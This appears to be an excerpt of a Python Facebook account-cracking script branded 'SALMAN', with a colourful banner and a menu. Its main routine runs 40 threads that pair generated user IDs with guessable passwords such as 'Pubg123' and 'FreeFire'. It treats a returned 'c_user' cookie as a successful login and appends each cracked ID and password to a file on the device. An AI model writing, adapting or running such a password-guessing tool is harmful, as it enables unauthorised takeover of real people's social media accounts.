...
logo =("""
\033[1;32m  
\033[1;32m  ____    _    _     __  __    _    _   _  
 \033[1;32m/ ___|  / \  | |   |  \/  |  / \  | \ | | 
\033[1;32m \___ \ / _ \ | |   | |\/| | / _ \ |  \| | 
\033[1;32m  ___) / ___ \| |___| |  | |/ ___ \| |\  | 
 \033[1;32m|____/_/   \_\_____|_|  |_/_/   \_\_| \_| 
                                           

\033[1;91m╔═════════════════════════╗
\033[1;92m   	ᏀᏆҒͲ ᏴƳ SALMAN 
\033[1;91m╚═════════════════════════╝
""") 
...
def Salman():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Salman = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Salman in ["1","A"]:
        Salmans()
    if Salman in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/1713018672413612/')
...
def Salmans():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ SALMAN ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(Salmanm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
...
def Salmanm(uid,pwx,tl):
    ...
    'viewport-width': '811',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SALMAN -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
